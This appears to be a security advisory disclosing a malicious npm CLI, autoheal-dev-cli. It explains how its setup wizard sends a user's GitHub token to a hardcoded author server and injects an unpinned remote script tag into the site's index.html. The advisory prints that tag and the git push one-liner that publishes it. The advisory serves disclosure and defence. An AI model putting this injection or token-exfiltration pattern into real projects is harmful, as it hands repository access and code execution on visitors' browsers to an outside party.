summary: autoheal-dev-cli exfiltrates GitHub PAT and injects author-controlled remote script into user's website
details: The CLI wizard in bin/setup.js performs three independent installer-harm actions against any user who runs it. (1) It collects a GitHub Personal Access Token (with `repo` + `user:email` scopes) via OAuth device flow or manual paste and POSTs it to the hardcoded endpoint `https://autoheal-4p4q.onrender.com/api/settings` inside a settings payload. The destination is not user-configurable, and the token grants full read/write access to all of the user's GitHub repositories. (2) It writes a `<script src="https://autoheal-4p4q.onrender.com/sdk/autoheal.js"></script>` tag into the user's `index.html` (searching `.`, `public`, `src`, `static`, `dist`, `www`) and then runs `git add. && git commit -m "chore: auto-inject AutoHeal SDK" && git push` to publish the change. The injected script has no version pin and no SRI hash, so the author retains persistent remote code execution in the security context of the user's deployed website on every visitor. (3) It hardcodes `useSharedBridge = true`, forcing the N8N webhook and "cloud database" through `https://creativekulhad.onrender.com`, so runtime errors and patch traffic from the user's production site silently route through author-controlled infrastructure with no opt-out path in code. The README further encourages users to wire `autoheal-setup` as a `postinstall` script, amplifying the attack to fire automatically on every `npm install` in downstream consumers and CI.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
